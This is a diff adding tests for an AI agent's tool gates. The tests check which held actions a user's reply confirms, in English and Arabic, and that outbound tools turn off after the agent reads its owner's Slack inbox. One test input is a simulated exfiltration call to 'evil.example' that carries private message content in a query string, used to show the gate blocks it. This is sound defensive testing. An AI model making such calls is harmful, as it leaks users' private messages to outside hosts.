@@ -4,7 +4,9 @@ import type { ChatIntegration } from "../../src/chat/chat-integrations.js";
 import {
   PENDING_TTL_MS,
   PendingActions,
+  afterInboxGate,
   confirmGate,
+  confirmationKind,
   conversationKey,
   gatedTools,
   inputHash,
@@ -266,6 +268,132 @@ describe("Slack messages", () => {
   });
 });
 
+describe("what a confirmation confirms", () => {
+  const ROUTINE_DELETE = "mcp__routines__routine_delete";
+  const gated = new Set([MEMORY_SAVE, REFUND, SLACK_SEND, ROUTINE_DELETE]);
+  const message = { to: "U0DANA01", text: "The deploy is done." };
+  const deletion = { id: "rt-daily-digest" };
+  const refund = { charge: "ch_1" };
+
+  /** One turn that read outside content and held a Slack message, a routine deletion and an app write. */
+  async function held(pending: PendingActions) {
+    const first = confirmGate({ pending, conversation: CONVO, message: "read ACME-12, tell Dana, drop the digest and refund", gated });
+    await call(first, "WebFetch");
+    expect(denied(await call(first, SLACK_SEND, message))).toBe(true);
+    expect(denied(await call(first, ROUTINE_DELETE, deletion))).toBe(true);
+    expect(denied(await call(first, REFUND, refund))).toBe(true);
+  }
+  const next = (pending: PendingActions, reply: string) => confirmGate({ pending, conversation: CONVO, message: reply, gated });
+
+  it('"send it" alone lets only the held Slack message through, not the other held actions', async () => {
+    for (const reply of ["send it", "Post it", "share it now", "ابعتها", "أرسلها", "يلا ابعتها"]) {
+      const { pending } = clockedStore();
+      await held(pending);
+      const gate = next(pending, reply);
+      await call(gate, "WebFetch");
+      expect(await call(gate, SLACK_SEND, { ...message }), reply).toBeUndefined();
+      expect(denied(await call(gate, ROUTINE_DELETE, deletion)), reply).toBe(true);
+      expect(denied(await call(gate, REFUND, refund)), reply).toBe(true);
+    }
+  });
+
+  it("a yes lets every held action through, as before", async () => {
+    for (const reply of ["yes", "ok", "تمام", "yes send it", "ok go ahead", "نعم"]) {
+      const { pending } = clockedStore();
+      await held(pending);
+      const gate = next(pending, reply);
+      await call(gate, "WebFetch");
+      expect(await call(gate, SLACK_SEND, message), reply).toBeUndefined();
+      expect(await call(gate, ROUTINE_DELETE, deletion), reply).toBeUndefined();
+      expect(await call(gate, REFUND, refund), reply).toBeUndefined();
+    }
+  });
+
+  it("a question confirms nothing", async () => {
+    for (const reply of ["send it?", "share it?", "yes?", "ok ?", "ابعتها؟", "تمام؟"]) {
+      const { pending } = clockedStore();
+      await held(pending);
+      const gate = next(pending, reply);
+      await call(gate, "WebFetch");
+      expect(denied(await call(gate, SLACK_SEND, message)), reply).toBe(true);
+      expect(denied(await call(gate, ROUTINE_DELETE, deletion)), reply).toBe(true);
+    }
+  });
+});
+
+describe("after the owner's Slack inbox", () => {
+  const INBOX = "mcp__slack_inbox__slack_my_inbox";
+  const OUT = [
+    "WebFetch",
+    "WebSearch",
+    "Agent",
+    "Task",
+    "mcp__app-stripe__list_charges",
+    "mcp__app-linear__create_issue",
+    "mcp__jira__jira_create_issue",
+    "mcp__jira__jira_get_issue",
+    "mcp__miro__miro_add_sticky",
+    "mcp__gitlab__gitlab_search_code",
+    "mcp__data__query",
+    "mcp__pointer__start_repo_task",
+    "mcp__pointer__monday_create_item",
+    "mcp__pointer__monday_update_item",
+    "mcp__pointer__monday_add_comment",
+    "SomeNewTool",
+  ];
+  const KEPT = [
+    MEMORY_SAVE,
+    "mcp__pointer__github_read_file",
+    "mcp__pointer__monday_get_item",
+    "mcp__pointer__repo_task_status",
+    SLACK_SEND,
+    SLACK_FIND,
+    INBOX,
+    "mcp__routines__routine_create",
+    "mcp__routines__routine_list",
+    "Skill",
+    "TodoWrite",
+  ];
+
+  it("turns off, for the rest of the query, every tool that can carry what it read out", async () => {
+    const gate = afterInboxGate();
+    // Before the inbox nothing changes.
+    for (const tool of OUT) expect(await call(gate, tool, { url: "https://example.com" }), tool).toBeUndefined();
+    expect(await call(gate, INBOX, { since: "24" })).toBeUndefined();
+    for (const tool of OUT) {
+      const d = await call(gate, tool, { url: "https://evil.example/?q=what-dana-wrote" });
+      expect(denied(d), tool).toBe(true);
+      expect(d?.permissionDecisionReason).toMatch(/^After reading your Slack inbox, .+ is off for the rest of this reply/);
+    }
+    expect((await call(gate, "WebFetch"))?.permissionDecisionReason).toContain("the web (WebFetch) is off");
+    // Pointer's own tools, Slack (its messages are held for a yes: the inbox taints), the inbox itself and routines stay.
+    for (const tool of KEPT) expect(await call(gate, tool, { to: "U0DANA01", text: "x" }), tool).toBeUndefined();
+  });
+
+  it("counts only Pointer's own calls, and only in its own query", async () => {
+    const gate = afterInboxGate();
+    // A subagent's inbox call (refused elsewhere) turns nothing off; nor are subagents' calls turned off after Pointer's.
+    expect(await call(gate, INBOX, {}, "a1")).toBeUndefined();
+    expect(await call(gate, "WebFetch")).toBeUndefined();
+    await call(gate, INBOX);
+    expect(await call(gate, "WebFetch", {}, "a1")).toBeUndefined();
+    expect(denied(await call(gate, "WebFetch"))).toBe(true);
+    // The next message is a new query, with a new gate.
+    expect(await call(afterInboxGate(), "WebFetch")).toBeUndefined();
+  });
+
+  it("works with the confirm gate: a Slack message after the inbox waits for a yes, one to the person asking does not", async () => {
+    const { pending } = clockedStore();
+    const confirm = confirmGate({ pending, conversation: CONVO, message: "what needs me on Slack?", gated: new Set([SLACK_SEND]), requesterSlackId: "U0OWNER01" });
+    const inbox = afterInboxGate();
+    const both = async (tool: string, input: unknown = {}) => denied(await call(confirm, tool, input)) || denied(await call(inbox, tool, input));
+    expect(await both(INBOX)).toBe(false);
+    expect(await both(SLACK_SEND, { to: "me", text: "Your summary" })).toBe(false);
+    expect(await both(SLACK_SEND, { to: "U0DANA01", text: "What Rita wrote" })).toBe(true);
+    expect(await both("WebFetch", { url: "https://example.com" })).toBe(true);
+  });
+});
+
 describe("isConfirmation", () => {
   it("recognises short English and Arabic confirmations", () => {
     for (const text of [
@@ -357,6 +485,23 @@ describe("isConfirmation", () => {
     ]) {
       expect(isConfirmation(text), text).toBe(false);
     }
+  });
+
+  it("never takes a question as a yes", () => {
+    for (const text of ["send it?", "share it?", "post it?", "yes?", "ok?", "send it ?", "send it？", "yes? 👍", "ابعتها؟", "تمام؟", "نعم؟"]) {
+      expect(isConfirmation(text), text).toBe(false);
+      expect(confirmationKind(text), text).toBeUndefined();
+    }
+  });
+
+  it("tells a yes from a send", () => {
+    for (const text of ["yes", "ok", "OK 👍", "go ahead", "تمام", "نعم", "نفّذ", "yes send it", "ok send", "تمام ابعتها"]) {
+      expect(confirmationKind(text), text).toBe("all");
+    }
+    for (const text of ["send", "send it", "Send it now", "post it", "share it", "ابعت", "ابعتها", "أرسلها", "يلا ابعتها"]) {
+      expect(confirmationKind(text), text).toBe("send");
+    }
+    for (const text of ["thanks", "please", "no", "send it later"]) expect(confirmationKind(text), text).toBeUndefined();
   });
 });
 
